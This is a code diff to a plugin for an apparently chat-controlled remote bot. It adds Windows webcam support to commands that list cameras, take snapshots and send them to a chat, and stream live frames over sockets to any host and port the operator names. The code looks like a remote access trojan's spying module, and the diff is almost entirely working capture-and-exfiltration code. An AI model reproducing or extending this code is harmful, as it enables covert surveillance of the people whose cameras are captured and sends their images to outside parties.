@@ -1,7 +1,14 @@
 from plugins import Plugin, Command
 from threading import Thread
-import pygame
-import pygame.camera
+import sys
+import os
+if sys.platform == 'win32':
+    import cv2
+    import numpy
+    from cv2 import VideoCapture,imwrite
+elif sys.platform in ['linux', 'linux2']:
+    import pygame
+    import pygame.camera
 
 import socket
 
@@ -11,9 +18,9 @@ class Main(Plugin):
     version = '1.0.0'
 
     def setup(self):
-
-        pygame.init()
-        pygame.camera.init()
+        if self.bot.platform in ['linux', 'linux2']:
+            pygame.init()
+            pygame.camera.init()
 
         c = Command('/cam_stream', usage='HOSTNAME /cam_stream <host> <port> <id> - stream webcam to remote host')
         self.add_command(c)
@@ -56,61 +63,107 @@ class Main(Plugin):
             t.start()
 
     def handle_cameras(self, chat_id):
-        try:
-            cameras = ['Camera ID: {}'.format(x) for x in pygame.camera.list_cameras()]
+        if self.bot.platform == 'win32':
+            try:
+                cam = []
+                for x in range(0, 10):
+                    camera = VideoCapture(x)
+                    if camera.grab():
+                        result = 'Camera ID: {}'.format(x)
+                        cam.append(result)
+                return self.bot.send_message(chat_id, '\n'.join(cam))
+            except Exception as e:
+                return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))
 
-            return self.bot.send_message(chat_id, '\n'.join(cameras))
-        except Exception as e:
-            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))
+        elif self.bot.platform in ['linux', 'linux2']:
+            try:
+                cameras = ['Camera ID: {}'.format(x) for x in pygame.camera.list_cameras()]
+
+                return self.bot.send_message(chat_id, '\n'.join(cameras))
+            except Exception as e:
+                return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))
 
 
     def handle_snapshot(self, chat_id, cam_id):
         self.bot.send_message(chat_id, 'Taking a picture!')
-        fname = self.bot.get_tmp(self.bot.generate_file_name('snapshot.png'))
-        try:
-            self.cam = pygame.camera.Camera(cam_id, (640,480))
-            self.cam.start()
-            image = self.cam.get_image()
-            self.cam.stop()
-            pygame.image.save(image, fname)
 
-            f = open(fname, 'rb')
+        if self.bot.platform == 'win32':
+            try:
+                camera = VideoCapture(int(cam_id))
+                for i in xrange(30):
+                    camera.read()
+                retval, camera_capture = camera.read()
+                fname = self.bot.get_tmp(self.bot.generate_file_name('snapshot.png'))
+                imwrite(fname, camera_capture)
+                del(camera)
+                f = open(fname, 'rb')
+                self.bot.bot.sendPhoto(chat_id, f)
+                f.close()
+                os.remove(fname)
+            except Exception as e:
+                self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))
+        elif self.bot.platform in ['linux', 'linux2']:
+            fname = self.bot.get_tmp(self.bot.generate_file_name('snapshot.png'))
+            try:
+                self.cam = pygame.camera.Camera(int(cam_id) if self.bot.platform == 'win32' else cam_id, (640, 480))
+                self.cam.start()
+                image = self.cam.get_image()
+                self.cam.stop()
+                pygame.image.save(image, fname)
 
-            self.bot.bot.sendPhoto(chat_id, f)
+                f = open(fname, 'rb')
 
-            f.close()
+                self.bot.bot.sendPhoto(chat_id, f)
 
-        except Exception as e:
-            self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))
+                f.close()
+
+            except Exception as e:
+                self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))
 
     def handle_cam_stream_stop(self):
         self.stop = True
 
     def handle_cam_stream(self, chat_id, host, port, cam_id):
-        try:
-            self.cam = pygame.camera.Camera(cam_id, (640, 480))
-            self.cam.start()
+        if self.bot.platform == 'win32':
+            try:
+                cap = cv2.VideoCapture(int(cam_id))
+                while not self.stop:
+                    ret, frame = cap.read()
+                    rval, imgencode = cv2.imencode(".jpg", frame, [1,90])
+                    data = numpy.array(imgencode)
+                    stringData = data.tostring()
 
-            self.stop = False
+                    s = socket.socket()
+                    s.connect((host, int(port)))
+                    s.sendall(stringData)
+                    s.close()
+            except Exception as e:
+                self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))
+        elif self.bot.platform in ['linux', 'linux2']:
+            try:
+                self.cam = pygame.camera.Camera(cam_id, (640, 480))
+                self.cam.start()
 
-            self.bot.send_message(chat_id, 'Webcam Streaming started, sending {} data to server {}:{}'.format(cam_id, host, port))
+                self.stop = False
 
-            while not self.stop:
-                s = socket.socket()
-                s.connect((host, int(port)))
+                self.bot.send_message(chat_id, 'Webcam Streaming started, sending {} data to server {}:{}'.format(cam_id, host, port))
 
-                image = self.cam.get_image()
+                while not self.stop:
+                    s = socket.socket()
+                    s.connect((host, int(port)))
 
-                data = pygame.image.tostring(image, 'RGB')
+                    image = self.cam.get_image()
 
-                s.sendall(data)
+                    data = pygame.image.tostring(image, 'RGB')
 
-                for event in pygame.event.get():
-                    if event.type == pygame.QUIT:
-                        return
+                    s.sendall(data)
 
-            self.cam.stop()
-            return self.bot.send_message(chat_id, 'Webcam Streaming stopped')
+                    for event in pygame.event.get():
+                        if event.type == pygame.QUIT:
+                            return
 
-        except Exception as e:
-            self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))
+                self.cam.stop()
+                return self.bot.send_message(chat_id, 'Webcam Streaming stopped')
+
+            except Exception as e:
+                self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))
